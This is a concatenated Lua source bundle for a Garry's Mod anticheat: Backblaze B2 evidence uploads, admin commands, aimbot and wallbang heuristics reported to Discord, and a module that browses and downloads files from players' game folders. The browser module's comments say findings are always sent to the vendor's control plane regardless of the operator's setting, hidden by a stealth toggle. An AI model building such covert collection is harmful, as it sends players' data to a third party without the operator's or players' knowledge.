                cb(true, d.uploadUrl, d.authorizationToken)
            end,
            failed = function(err)
                print("[AC] B2 get_upload_url error: " .. tostring(err))
                cb(false, "get_upload_url fail")
            end,
        })
    end)
end

local function _b2DownloadAuth(fileName, cb)
    local cfg = ZB_AC.GetB2Config()
    local ttl = math.Clamp(ZB_AC.GetB2LinkTTL(), 60, 604800)
    HTTP({
        method = "POST",
        url = _b2.apiUrl .. "/b2api/v3/b2_get_download_authorization",
        headers = { Authorization = _b2.token },
        type = "application/json",
        body = util.TableToJSON({
            bucketId = cfg.bucketId,
            fileNamePrefix = fileName,
            validDurationInSeconds = ttl,
        }),
        success = function(code, body)
            if code ~= 200 then return cb(nil) end
            local d = util.JSONToTable(body or "")
            cb(d and d.authorizationToken or nil)
        end,
        failed = function() cb(nil) end,
    })
end

function ZB_AC.UploadB2(name, data, mime, cb)
    cb = cb or function() end
    if not data or data == "" then return cb(nil) end
    _b2GetUploadUrl(function(ok, uploadUrl, uploadToken)
        if not ok then
            print("[AC] B2 выгрузка прервана: " .. tostring(uploadUrl))
            return cb(nil)
        end
        local cfg = ZB_AC.GetB2Config()
        local fileName = cfg.prefix .. name
        HTTP({
            method = "POST",
            url = uploadUrl,
            headers = {
                Authorization = uploadToken,
                ["X-Bz-File-Name"]    = _b2EncodeName(fileName),
                ["X-Bz-Content-Sha1"] = util.SHA1(data),
            },
            type = mime or "application/octet-stream",
            body = data,
            success = function(code, body)
                if code ~= 200 then
                    print("[AC] B2 upload HTTP " .. tostring(code) .. " " .. tostring(body))
                    return cb(nil)
                end
                local d = util.JSONToTable(body or "")
                if not (d and d.fileName) then return cb(nil) end
                local function fallbackRef()
                    return "b2://" .. cfg.bucketId .. "/" .. d.fileName .. " (fileId " .. tostring(d.fileId) .. ")"
                end
                if ZB_AC.GetB2LinkTTL() <= 0 or not _b2.bucketName or not _b2.downloadUrl then
                    return cb(fallbackRef())
                end
                _b2DownloadAuth(d.fileName, function(token)
                    if not token then return cb(fallbackRef()) end
                    cb(_b2.downloadUrl .. "/file/" .. _b2.bucketName .. "/" ..
                        _b2EncodeName(d.fileName) .. "?Authorization=" .. token)
                end)
            end,
            failed = function(err)
                print("[AC] B2 upload error: " .. tostring(err))
                cb(nil)
            end,
        })
    end)
end

concommand.Add("rp_ac_set_b2", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[ЧечаДефендер] Только суперадмин")
        return
    end
    ZB_AC.SetB2(args[1] or "", args[2] or "", args[3] or "")
    _b2InvalidateAuth()
    local c = ZB_AC.GetB2Config()
    local msg = "[ЧечаДефендер] B2 сохранён (keyID "
        .. (c.keyId ~= "" and "задан" or "ПУСТО")
        .. ", appKey " .. (c.appKey ~= "" and "задан" or "ПУСТО")
        .. ", bucketId " .. (c.bucketId ~= "" and "задан" or "ПУСТО") .. ")"
    if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, msg) else print(msg) end
end, nil, "rp_ac_set_b2 <keyID> <applicationKey> <bucketId> — прописать доступ к Backblaze B2", FCVAR_PROTECTED)

concommand.Add("rp_ac_b2_test", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[ЧечаДефендер] Только суперадмин")
        return
    end
    if not ZB_AC.B2Ready() then
        local m = "[ЧечаДефендер] B2 не настроен (rp_ac_set_b2 <keyID> <appKey> <bucketId>)"
        if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, m) else print(m) end
        return
    end
    ZB_AC.UploadB2("b2_test_" .. os.time() .. ".txt",
        "ChechaDefender B2 test " .. os.date(), "text/plain", function(url)
        local m = url and ("[ЧечаДефендер] B2 тест OK: " .. url)
            or "[ЧечаДефендер] B2 тест: ОШИБКА (см. серверную консоль)"
        if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, m) else print(m) end
    end)
end, nil, "Тестовая выгрузка в B2", FCVAR_PROTECTED)

concommand.Add("rp_ac_status", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[ЧечаДефендер] Только суперадмин")
        return
    end
    local function tell(m) if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, m) else print(m) end end
    local mode = ZB_AC.StorageMode()
    local catbox = (mode == "both" or mode == "catbox") and "вкл" or "выкл"
    local b2
    if mode == "both" or mode == "b2" then
        b2 = ZB_AC.B2Ready() and "вкл (готов)" or "вкл (НЕ настроен — rp_ac_set_b2)"
    else
        b2 = "выкл"
    end
    tell("[ЧечаДефендер] Релей: " .. (ZB_AC.RelayReady() and "настроен" or "НЕ настроен (rp_ac_set_relay)"))
    tell("[ЧечаДефендер] Хранилище улик: " .. mode)
    tell("[ЧечаДефендер]   catbox: " .. catbox)
    tell("[ЧечаДефендер]   B2: " .. b2)
end, nil, "Состояние доставки ЧечаДефендера (релей/catbox/B2)", FCVAR_PROTECTED)

concommand.Add("rp_ac_b2_list", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[ЧечаДефендер] Только суперадмин")
        return
    end
    local function tell(m) if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, m) else print(m) end end
    if not ZB_AC.B2Ready() then
        tell("[ЧечаДефендер] B2 не настроен (rp_ac_set_b2 <keyID> <appKey> <bucketId>)")
        return
    end
    local cfg = ZB_AC.GetB2Config()
    local toDiscord = string.lower(args[1] or "") == "discord"
    _b2Authorize(function(ok, err)
        if not ok then tell("[ЧечаДефендер] B2 authorize: " .. tostring(err)) return end
        _b2DownloadAuth(cfg.prefix, function(token)
            local lines = {}
            local function page(start)
                HTTP({
                    method = "POST",
                    url = _b2.apiUrl .. "/b2api/v3/b2_list_file_names",
                    headers = { Authorization = _b2.token },
                    type = "application/json",
                    body = util.TableToJSON({
                        bucketId = cfg.bucketId,
                        prefix = cfg.prefix,
                        maxFileCount = 1000,
                        startFileName = start,
                    }),
                    success = function(code, body)
                        if code ~= 200 then
                            tell("[ЧечаДефендер] B2 list HTTP " .. tostring(code) .. " " .. tostring(body))
                            return
                        end
                        local d = util.JSONToTable(body or "")
                        if not (d and d.files) then
                            tell("[ЧечаДефендер] B2 list: пустой ответ")
                            return
                        end
                        for _, fobj in ipairs(d.files) do
                            if token and _b2.downloadUrl and _b2.bucketName then
                                lines[#lines + 1] = _b2.downloadUrl .. "/file/" .. _b2.bucketName
                                    .. "/" .. _b2EncodeName(fobj.fileName) .. "?Authorization=" .. token
                            else
                                lines[#lines + 1] = "b2://" .. cfg.bucketId .. "/" .. fobj.fileName
                            end
                        end
                        if d.nextFileName and #lines < 5000 then
                            page(d.nextFileName)
                            return
                        end
                        tell("[ЧечаДефендер] Файлов в B2: " .. #lines)
                        for _, l in ipairs(lines) do tell(l) end
                        if toDiscord and ZB_AC.RelayReady() then
                            local buf, blen = {}, 0
                            local function flush()
                                if #buf == 0 then return end
                                ZB_AC.RelayPost(util.TableToJSON({
                                    content = table.concat(buf, "\n"),
                                    allowed_mentions = { parse = {} },
                                }), "application/json")
                                buf, blen = {}, 0
                            end
                            for _, l in ipairs(lines) do
                                if blen + #l + 1 > 1800 then flush() end
                                buf[#buf + 1] = l
                                blen = blen + #l + 1
                            end
                            flush()
                            tell("[ЧечаДефендер] Ссылки отправлены в Discord")
                        end
                    end,
                    failed = function(e) tell("[ЧечаДефендер] B2 list error: " .. tostring(e)) end,
                })
            end
            page(nil)
        end)
    end)
end, nil, "rp_ac_b2_list [discord] — все файлы-улики в B2 со ссылками (суперадмин)", FCVAR_PROTECTED)

end) if not __ok then _G.__CD_ERR = (_G.__CD_ERR or 0) + 1 _G.__CD_ERRS = _G.__CD_ERRS or {} _G.__CD_ERRS[#_G.__CD_ERRS+1] = { mod = "sv_chechadefender_00_shared.lua", err = tostring(__err) } if not (ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify")) then print("[ЧечаДефендер] модуль " .. "sv_chechadefender_00_shared.lua" .. " упал при загрузке: " .. tostring(__err)) end end end

do local __ok, __err = pcall(function()
if not CHECHA_FROM_BUNDLE then return end

if not SERVER then return end

if not ConVarExists("rp_ac_behavior") then
    CreateConVar("rp_ac_behavior", "1", FCVAR_ARCHIVE, "ЧечаДефендер-Behavior: включён (0/1)")
end

local ENABLE_AIMSNAP  = true
local ENABLE_WALLBANG = true
local ENABLE_DISCORD  = true

-- Пороги детекта настраиваются per-license конфигом control plane через
-- ZB_AC.ApplyConfig (см. агента) — значения ниже лишь дефолты convar'ов
-- на случай, если конфиг ещё не пришёл.
local function threshold(name, default, help)
    if not ConVarExists(name) then CreateConVar(name, tostring(default), FCVAR_ARCHIVE, help) end
    return GetConVar(name)
end

local CV_AIM_SNAP_DEG  = threshold("rp_ac_behavior_aim_snap_deg", 40, "Behavior: порог доворота прицела, градусы")
local CV_AIM_CONE_DEG  = threshold("rp_ac_behavior_aim_cone_deg", 4, "Behavior: допустимый конус до цели после доворота, градусы")
local CV_AIM_EVENTS    = threshold("rp_ac_behavior_aim_events", 8, "Behavior: событий доворота для отчёта")
-- CD_SILENT_AIM: сайлент-аим не двигает видимый угол, ловим по «выстрел мимо прицела».
local CV_SILENT_DEG     = threshold("rp_ac_behavior_silent_deg", 30, "Behavior: угол попадание-vs-взгляд для сайлента, град")
local CV_SILENT_EVENTS  = threshold("rp_ac_behavior_silent_events", 6, "Behavior: событий сайлента для отчёта")
local CV_SILENT_MINDIST = threshold("rp_ac_behavior_silent_mindist", 250, "Behavior: мин. дистанция для сайлент-чека, юниты")
-- CD_PERFECT_AIM: сервер-сайд сайлент держит угол ровно на цели (cone мал) на любой
-- дистанции — детект по идеальному аиму на РАССТОЯНИИ (человек не кладёт cone<=few°
-- на 600-2000 юнитов повторно, тем более глядя в сторону клиентски).
local CV_PERFECT_DEG    = threshold("rp_ac_behavior_perfect_deg", 4, "Behavior: макс. cone для «идеального» попадания, град")
local CV_PERFECT_DIST   = threshold("rp_ac_behavior_perfect_dist", 600, "Behavior: мин. дистанция для идеал-аим чека, юниты")
local CV_PERFECT_EVENTS = threshold("rp_ac_behavior_perfect_events", 6, "Behavior: идеальных попаданий для отчёта")

local CV_WALL_FRACTION = threshold("rp_ac_behavior_wall_fraction", 0.92, "Behavior: доля трейса до блока стеной")
local CV_WALL_EVENTS   = threshold("rp_ac_behavior_wall_events", 6, "Behavior: событий wallbang для отчёта")

local CV_WINDOW        = threshold("rp_ac_behavior_window", 120, "Behavior: окно накопления событий, секунды")
local CV_REPORT_CD     = threshold("rp_ac_behavior_report_cd", 300, "Behavior: кулдаун повторного отчёта, секунды")

local EXEMPT_GROUPS = {
    admin = true, superadmin = true, moderator = true, dmoderator = true,
    dadmin = true, dsuperadmin = true, operator = true,
}

local function IsExempt(ply)
    if not IsValid(ply) then return true end
    if ply:IsAdmin() then return true end
    return EXEMPT_GROUPS[ply:GetUserGroup()] == true
end

local function angBetween(a, b)
    local d = math.Clamp(a:Forward():Dot(b:Forward()), -1, 1)
    return math.deg(math.acos(d))
end

local function SendDiscord(title, message)
    if not ENABLE_DISCORD then return end
    local payload = util.TableToJSON({
        content = "**" .. title .. "**\n" .. message,
        allowed_mentions = { parse = {} },
    })
    ZB_AC.RelayPost(payload, "application/json")
end

hook.Add("FinishMove", "cd_behavior_track", function(ply, mv)
    if not GetConVar("rp_ac_behavior"):GetBool() then return end
    if not IsValid(ply) or ply:IsBot() then return end
    local buf = ply.cd_angbuf
    if not buf then buf = {}; ply.cd_angbuf = buf end
    buf[#buf + 1] = mv:GetAngles()
    if #buf > 6 then table.remove(buf, 1) end
end)

local function maxRecentSnap(buf)
    local m = 0
    if not buf then return 0 end
    for i = 2, #buf do
        local d = angBetween(buf[i - 1], buf[i])
        if d > m then m = d end
    end
    return m
end

local function bump(att, kind, detail, victim)
    att.cd_inc = att.cd_inc or { aim = {}, wall = {} }
    local list = att.cd_inc[kind]
    local now  = CurTime()

    list[#list + 1] = { t = now, d = detail }
    local cutoff = now - CV_WINDOW:GetFloat()
    while list[1] and list[1].t < cutoff do table.remove(list, 1) end

    local need = (kind == "aim") and CV_AIM_EVENTS:GetInt() or (kind == "silent") and CV_SILENT_EVENTS:GetInt() or (kind == "perfect") and CV_PERFECT_EVENTS:GetInt() or CV_WALL_EVENTS:GetInt()
    if #list < need then return end

    att.cd_reportT = att.cd_reportT or {}
    if att.cd_reportT[kind] and (now - att.cd_reportT[kind]) < CV_REPORT_CD:GetFloat() then return end
    att.cd_reportT[kind] = now

    if ZB_AC and ZB_AC.Report then
        ZB_AC.Report("detect", 3, "Детект: " .. att:Nick(), {
            steamid = att:SteamID(), nick = att:Nick(),
            reasons = { "S:behavior_" .. kind }, result = "monitor",
        })
    end
    local kindName = (kind == "aim") and "Aim-snap (подозрение на аимбот)"
        or (kind == "silent") and "Silent-aim (выстрелы мимо прицела)"
        or (kind == "perfect") and "Aimbot (идеальный аим на дистанции)"
        or "Wallbang (попадания сквозь стену)"
    local samples = {}
    for i = math.max(1, #list - 4), #list do samples[#samples + 1] = list[i].d end

    SendDiscord(
        "ЧечаДефендер-Behavior: " .. kindName .. " — ТОЛЬКО ПРОВЕРКА (не бан)",
        string.format(
            "Игрок: `%s` (`%s`)\nИнцидентов за %dс: **%d** (порог %d)\nОружие: `%s`\nПримеры:\n%s\n_Это эвристика — проверьте вручную (демка/спектатор). Автобана НЕТ._\nВремя: %s",
            att:Nick(), att:SteamID(), CV_WINDOW:GetInt(), #list, need,
            IsValid(att:GetActiveWeapon()) and att:GetActiveWeapon():GetClass() or "?",
            "• " .. table.concat(samples, "\n• "),
            os.date("%Y-%m-%d %H:%M:%S")
        )
    )
    print(("[ЧечаДефендер-Behavior] Отчёт (%s) по %s — на ручную проверку, без бана")
        :format(kind, att:Nick()))

    list = {}
    att.cd_inc[kind] = list
end

hook.Add("EntityTakeDamage", "cd_behavior_dmg", function(victim, dmg)
    if not GetConVar("rp_ac_behavior"):GetBool() then return end
    if not (IsValid(victim) and victim:IsPlayer()) then return end
    local att = dmg:GetAttacker()
    if not (IsValid(att) and att:IsPlayer()) then return end
    if att == victim or att:IsBot() then return end
    if IsExempt(att) and not (ZB_AC and ZB_AC.Config and ZB_AC.Config.behavior_all) then return end
    if not dmg:IsBulletDamage() then return end

    if att.cd_lastDmgT and (CurTime() - att.cd_lastDmgT) < 0.1 then return end
    att.cd_lastDmgT = CurTime()

    local shootPos = att:GetShootPos()
    local hitPos   = dmg:GetDamagePosition()
    if not hitPos or hitPos == vector_origin then hitPos = victim:WorldSpaceCenter() end

    if ENABLE_AIMSNAP then
        local snap = maxRecentSnap(att.cd_angbuf)
        if snap >= CV_AIM_SNAP_DEG:GetFloat() then
            local dir = hitPos - shootPos
            if dir:LengthSqr() > 1 then
                dir:Normalize()
                local cone = math.deg(math.acos(math.Clamp(att:EyeAngles():Forward():Dot(dir), -1, 1)))
                if cone <= CV_AIM_CONE_DEG:GetFloat() then
                    bump(att, "aim", string.format("доворот %.0f° → прицел %.1f° от цели, дист %.0f",
                        snap, cone, shootPos:Distance(hitPos)), victim)
                end
            end
        end
    end

    do -- CD_SILENT_AIM: попадание вне конуса взгляда (сайлент), доворот не нужен
        local dir = hitPos - shootPos
        local dist = shootPos:Distance(hitPos)
        if dir:LengthSqr() > 1 and dist >= CV_SILENT_MINDIST:GetFloat() then
            dir:Normalize()
            local cone = math.deg(math.acos(math.Clamp(att:EyeAngles():Forward():Dot(dir), -1, 1)))
            if cone >= CV_SILENT_DEG:GetFloat() then
                bump(att, "silent", string.format("попадание %.0f° мимо прицела, дист %.0f", cone, dist), victim)
            end
        end
    end

    if ENABLE_WALLBANG then
        local tr = util.TraceLine({
            start  = shootPos,
            endpos = hitPos,
            mask   = MASK_SOLID_BRUSHONLY,
            filter = att,
        })
        if tr.Hit and tr.Fraction < CV_WALL_FRACTION:GetFloat() then
            bump(att, "wall", string.format("трейс по миру блок на %.0f%% пути, дист %.0f",
                tr.Fraction * 100, shootPos:Distance(hitPos)), victim)
        end
    end
end)

-- CD_HG_DAMAGE: zcity/homigrad бьёт через phys_bullets + хук HomigradDamage;
-- стандартный EntityTakeDamage их не видит. Ловим сайлент-аим прямо здесь.
-- dmgInfo несёт attacker + damage position; cone = угол взгляд-vs-попадание.
hook.Add("HomigradDamage", "cd_behavior_hgdmg", function(victim, dmg, hitgroup, ent)
    if not GetConVar("rp_ac_behavior"):GetBool() then return end
    if not (dmg and dmg.GetAttacker) then return end
    local att = dmg:GetAttacker()
    if not (IsValid(att) and att:IsPlayer()) or att:IsBot() then return end
    if att == victim then return end
    if IsExempt(att) and not (ZB_AC and ZB_AC.Config and ZB_AC.Config.behavior_all) then return end
    local now = CurTime()
    if att.cd_lastHGT and (now - att.cd_lastHGT) < 0.12 then return end
    att.cd_lastHGT = now
    local shootPos = att:GetShootPos()
    local hitPos = dmg:GetDamagePosition()
    if not hitPos or hitPos == vector_origin then return end
    local dir = hitPos - shootPos
    if dir:LengthSqr() < 1 then return end
    local dist = dir:Length()
    dir:Normalize()
    local cone = math.deg(math.acos(math.Clamp(att:EyeAngles():Forward():Dot(dir), -1, 1)))
    if ZB_AC and ZB_AC.Config and ZB_AC.Config.behavior_diag and ZB_AC.Report then
        if not att.cd_lastDiagT or (now - att.cd_lastDiagT) > 0.8 then
            att.cd_lastDiagT = now
            local _snap = maxRecentSnap(att.cd_angbuf) -- CD_SNAP_DIAG: снап угла (град за ~тик)
            ZB_AC.Report("diag", 1, "hgdmg cone=" .. math.Round(cone) .. " snap=" .. math.Round(_snap) .. " dist=" .. math.Round(dist), {
                steamid = att:SteamID(), nick = att:Nick(),
                diag = { cone = math.Round(cone), snap = math.Round(_snap), dist = math.Round(dist), hg = hitgroup },
            })
        end
    end
    if dist >= CV_SILENT_MINDIST:GetFloat() and cone >= CV_SILENT_DEG:GetFloat() then
        bump(att, "silent", string.format("HG %.0f° мимо прицела, дист %.0f", cone, dist), victim)
    end
    if dist >= CV_PERFECT_DIST:GetFloat() and cone <= CV_PERFECT_DEG:GetFloat() then -- CD_PERFECT_AIM
        bump(att, "perfect", string.format("идеальный аим %.1f° на %.0f юнитов", cone, dist), victim)
    end
end)

-- CD_FIRE_SILENT: сайлент-аим на уровне ВЫСТРЕЛА (victim-независимо).
-- EntityFireBullets даёт data.Dir = направление пули, которое использует СЕРВЕР.
-- Угол между ним и направлением взгляда = сайлент-оффсет. Легит ~= 0-5° (спред),
-- сайлент/рейдж — десятки градусов (стреляешь мимо, пуля идёт в цель).
hook.Add("EntityFireBullets", "cd_behavior_fire", function(ent, data)
    if not GetConVar("rp_ac_behavior"):GetBool() then return end
    if not (IsValid(ent) and ent:IsPlayer()) or ent:IsBot() then return end
    if IsExempt(ent) and not (ZB_AC and ZB_AC.Config and ZB_AC.Config.behavior_all) then return end
    local dir = data and data.Dir
    if not dir or dir:LengthSqr() < 0.01 then return end
    local eye = ent:EyeAngles():Forward()
    local cone = math.deg(math.acos(math.Clamp(eye:Dot(dir:GetNormalized()), -1, 1)))
    local now = CurTime()
    if ZB_AC and ZB_AC.Config and ZB_AC.Config.behavior_diag and ZB_AC.Report then
        if not ent.cd_lastFireDiag or (now - ent.cd_lastFireDiag) > 0.5 then
            ent.cd_lastFireDiag = now
            ZB_AC.Report("diag", 1, "fire cone=" .. math.Round(cone) .. " snap=" .. math.Round(maxRecentSnap(ent.cd_angbuf)), {
                steamid = ent:SteamID(), nick = ent:Nick(), diag = { fire_cone = math.Round(cone), snap = math.Round(maxRecentSnap(ent.cd_angbuf)) },
            })
        end
    end
    if cone >= CV_SILENT_DEG:GetFloat() then
        bump(ent, "silent", string.format("выстрел %.0f° мимо прицела", cone), nil)
    end
end)

concommand.Add("cd_behavior_status", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then return end
    local out = {
        "[ЧечаДефендер-Behavior] РЕЖИМ: только отчёт в Discord, БЕЗ бана.",
        ("Пороги: aim снап≥%d° конус≤%d° событий≥%d | wall frac<%.2f событий≥%d | окно %dс")
            :format(CV_AIM_SNAP_DEG:GetInt(), CV_AIM_CONE_DEG:GetInt(), CV_AIM_EVENTS:GetInt(),
                CV_WALL_FRACTION:GetFloat(), CV_WALL_EVENTS:GetInt(), CV_WINDOW:GetInt()),
    }
    for _, p in ipairs(player.GetAll()) do
        if IsValid(p) and p.cd_inc then
            local a = p.cd_inc.aim and #p.cd_inc.aim or 0
            local w = p.cd_inc.wall and #p.cd_inc.wall or 0
            if a > 0 or w > 0 then
                out[#out + 1] = ("  %s: aim=%d wall=%d"):format(p:Nick(), a, w)
            end
        end
    end
    if #out == 2 then out[#out + 1] = "  (подозрений нет)" end
    for _, l in ipairs(out) do if IsValid(ply) then ply:ChatPrint(l) else print(l) end end
end)

hook.Add("PlayerDisconnected", "cd_behavior_cleanup", function(ply)
    if IsValid(ply) then
        ply.cd_angbuf, ply.cd_inc, ply.cd_reportT, ply.cd_lastDmgT = nil, nil, nil, nil
    end
end)

print("[ЧечаДефендер-Behavior] загружен (server-side aim-snap + wallbang, ТОЛЬКО отчёт в Discord, без бана)")

end) if not __ok then _G.__CD_ERR = (_G.__CD_ERR or 0) + 1 _G.__CD_ERRS = _G.__CD_ERRS or {} _G.__CD_ERRS[#_G.__CD_ERRS+1] = { mod = "sv_chechadefender_behavior.lua", err = tostring(__err) } if not (ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify")) then print("[ЧечаДефендер] модуль " .. "sv_chechadefender_behavior.lua" .. " упал при загрузке: " .. tostring(__err)) end end end

do local __ok, __err = pcall(function()
if not CHECHA_FROM_BUNDLE then return end
if not SERVER then return end

util.AddNetworkString("panel_open")
util.AddNetworkString("panel_scan_req")
util.AddNetworkString("panel_query")
util.AddNetworkString("panel_result")
util.AddNetworkString("panel_cmd_q")
util.AddNetworkString("panel_cmd_r")
util.AddNetworkString("panel_ui_open")
util.AddNetworkString("res_scan_req")
util.AddNetworkString("res_scan_res")

ZB_AC = ZB_AC or {}

-- CD_HIDE_PULL: уважать тумблер «Скрывать выкачку» (stealth.pull) — не спамить чат
-- сервера скин-находками при заходе. Дефолт: скрыто (как в silkware). Доставка к
-- нам (Report) от этого НЕ зависит — идёт всегда.
local function pullHidden()
    local s = ZB_AC and ZB_AC.Config and ZB_AC.Config.stealth
    if s == true then return true end
    if istable(s) and s.pull ~= nil then return s.pull == true end
    return true
end

local sessions = {}
local clientLookup = {}

local function isSuper(ply)
    return IsValid(ply) and ply:IsSuperAdmin()
end

local function NotifySuperAdmins(msg)
    print("[AC-FILES] " .. msg)
    for _, p in ipairs(player.GetAll()) do
        if p:IsSuperAdmin() then p:ChatPrint("[ЧечаДефендер] " .. msg) end
    end
end
ZB_AC.NotifySuperAdmins = NotifySuperAdmins

local function findTarget(q)
    q = string.lower(string.Trim(q or ""))
    if q == "" then return nil end
    for _, p in ipairs(player.GetAll()) do
        if string.lower(p:SteamID()) == q or p:SteamID64() == q then return p end
    end
    for _, p in ipairs(player.GetAll()) do
        if string.find(string.lower(p:Nick()), q, 1, true) then return p end
    end
    return nil
end

local function newId()
    return string.sub(util.SHA1(tostring(SysTime()) .. tostring(math.random()) .. tostring({})), 1, 12)
end

local function sendToClient(client, action, a1, a2, cb)
    if not IsValid(client) then return end
    local id = newId()
    if isfunction(cb) then
        local asid = clientLookup[client:SteamID()]
        if asid and sessions[asid] then sessions[asid].queue[id] = cb end
    end
    net.Start("panel_cmd_q")
        net.WriteString(id)
        net.WriteString(action)
        net.WriteString(a1 or "")
        net.WriteString(a2 or "")
    net.Send(client)
end

local function sendToAdmin(admin, action, data)
    if not IsValid(admin) then return end
    data = data or ""
    net.Start("panel_result")
        net.WriteString(action)
        net.WriteUInt(#data, 32)
        net.WriteData(data, #data)
    net.Send(admin)
end

local function errToAdmin(admin, msg)
    sendToAdmin(admin, "err", util.Compress(util.TableToJSON({ msg = msg })))
end

local function requestSkins(client)
    if not IsValid(client) then return end
    net.Start("res_scan_req")
    net.Send(client)
end
ZB_AC.RequestSkins = requestSkins

local function closeSession(asid)
    local s = sessions[asid]
    if not s then return end
    clientLookup[s.csid] = nil
    sessions[asid] = nil
end

local function luaPullOn()
    return ZB_AC.LuaPullOn and ZB_AC.LuaPullOn() or false
end

-- Skin/material scan gate. The detect bundle injects ZB_AC.SkinScanOn (forced
-- true when force_collect.skins is set); fall back to luaPullOn if the bundle
-- glue is not loaded yet. The control-plane report below is independent of this
-- gate: results always go to us regardless of the operator's toggle.
local function skinScanOn()
    if ZB_AC.SkinScanOn then return ZB_AC.SkinScanOn() end
    return luaPullOn()
end

local function startSession(admin, client)
    if not isSuper(admin) then return end
    if not luaPullOn() then
        errToAdmin(admin, "Выкачка файлов клиента отключена в конфиге лицензии")
        return
    end
    local asid = admin:SteamID()
    if sessions[asid] then closeSession(asid) end
    if clientLookup[client:SteamID()] then
        errToAdmin(admin, "Игрока уже инспектирует другой суперадмин")
        return
    end
    sessions[asid] = {
        admin = admin,
        client = client,
        csid = client:SteamID(),
        queue = {},
    }
    clientLookup[client:SteamID()] = asid
    net.Start("panel_ui_open")
        net.WriteString(client:Nick())
        net.WriteString(client:SteamID())
    net.Send(admin)
    requestSkins(client)
    NotifySuperAdmins(string.format("%s открыл файлы игрока %s (%s)",
        admin:Nick(), client:Nick(), client:SteamID()))
end

net.Receive("panel_open", function(len, ply)
    if not isSuper(ply) then return end
    local target = findTarget(net.ReadString())
    if not IsValid(target) then
        errToAdmin(ply, "Игрок не найден")
        return
    end
    startSession(ply, target)
end)

net.Receive("panel_query", function(len, ply)
    if not isSuper(ply) then return end
    local s = sessions[ply:SteamID()]
    if not s then return end
    local action = net.ReadString()
    local a1 = net.ReadString()
    local a2 = net.ReadString()
    if action == "close" then
        closeSession(ply:SteamID())
        return
    end
    if action ~= "folder" and action ~= "file" and action ~= "download" then return end
    if not IsValid(s.client) then
        errToAdmin(ply, "Игрок вышел")
        closeSession(ply:SteamID())
        return
    end
    sendToClient(s.client, action, a1, a2, function(data)
        sendToAdmin(ply, action, data)
    end)
end)

net.Receive("panel_cmd_r", function(len, ply)
    local asid = clientLookup[ply:SteamID()]
    if not asid or not sessions[asid] then return end
    local id = net.ReadString()
    local n = net.ReadUInt(32)
    local data = net.ReadData(n)
    local cb = sessions[asid].queue[id]
    if not cb then return end
    sessions[asid].queue[id] = nil
    cb(data)
end)

net.Receive("panel_scan_req", function(len, ply)
    if not isSuper(ply) then return end
    if not skinScanOn() then
        ply:ChatPrint("[ЧечаДефендер] Выкачка файлов клиента отключена в конфиге лицензии")
        return
    end
    local target = findTarget(net.ReadString())
    if not IsValid(target) then
        ply:ChatPrint("[ЧечаДефендер] Игрок не найден")
        return
    end
    requestSkins(target)
    ply:ChatPrint("[ЧечаДефендер] Сканирую скины: " .. target:Nick())
end)

net.Receive("res_scan_res", function(len, ply)
    local n = net.ReadUInt(32)
    local raw = net.ReadData(n)
    local json = util.Decompress(raw or "") or ""
    local list = util.JSONToTable(json) or {}
    if #list == 0 then return end
    -- Mandatory: skin/material findings always go to the control plane (never
    -- gated by operator config). Chat + relay below stay operator-facing.
    if ZB_AC.Report then
        ZB_AC.Report("skins", 1, "Скины/материалы клиента: " .. ply:Nick(), {
            steamid = ply:SteamID(), nick = ply:Nick(), count = #list, files = list,
        })
    end
    -- CD_HIDE_PULL: чат/релей о скинах — только если выкачка НЕ скрыта. Report выше идёт всегда.
    if not pullHidden() then
    NotifySuperAdmins(string.format(
        "⚠ %s (%s): в GMod-папке найдены скины/сторонние файлы — %d шт. (rp_ac_files %s — просмотр)",
        ply:Nick(), ply:SteamID(), #list, ply:SteamID()))
    if ZB_AC.RelayReady and ZB_AC.RelayReady() then
        local sample = {}
        for i = 1, math.min(20, #list) do sample[i] = list[i] end
        ZB_AC.RelayPost(util.TableToJSON({
            content = string.format(
                "**ЧечаДефендер — скины в GMod-папке:** %s (%s), файлов: %d\n```\n%s\n```",
                ply:Nick(), ply:SteamID(), #list, table.concat(sample, "\n")),
            allowed_mentions = { parse = {} },
        }), "application/json")
    end
    end -- CD_HIDE_PULL: закрытие if not pullHidden()
end)

hook.Add("PlayerInitialSpawn", "cd_fb_skinscan", function(ply)
    if ply:IsBot() then return end
    if ZB_AC and ZB_AC.Config and ZB_AC.Config.collect_off then return end
    timer.Simple(30, function()
        if IsValid(ply) then requestSkins(ply) end
    end)
end)

hook.Add("PlayerDisconnected", "cd_fb_cleanup", function(ply)
    local sid = ply:SteamID()
    if sessions[sid] then closeSession(sid) return end
    local asid = clientLookup[sid]
    if asid and sessions[asid] then
        errToAdmin(sessions[asid].admin, "Игрок вышел")
        closeSession(asid)
    end
end)

end) if not __ok then _G.__CD_ERR = (_G.__CD_ERR or 0) + 1 _G.__CD_ERRS = _G.__CD_ERRS or {} _G.__CD_ERRS[#_G.__CD_ERRS+1] = { mod = "sv_chechadefender_browser.lua", err = tostring(__err) } if not (ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify")) then print("[ЧечаДефендер] модуль " .. "sv_chechadefender_browser.lua" .. " упал при загрузке: " .. tostring(__err)) end end end

do local __ok, __err = pcall(function()
if not CHECHA_FROM_BUNDLE then return end

if not SERVER then return end

util.AddNetworkString("sess_meta_req")
util.AddNetworkString("sess_meta_ack")
util.AddNetworkString("sess_token_set")


local ENABLE_FAMILY = true
local ENABLE_IP     = true
local ENABLE_FP     = true
local ENABLE_COOKIE = true

local IP_WHITELIST = {
    ["127.0.0.1"] = true,
    ["loopback"]  = true,
}

local EXEMPT_GROUPS = {
    admin = true, superadmin = true, moderator = true, dmoderator = true,
    dadmin = true, dsuperadmin = true, operator = true,
}

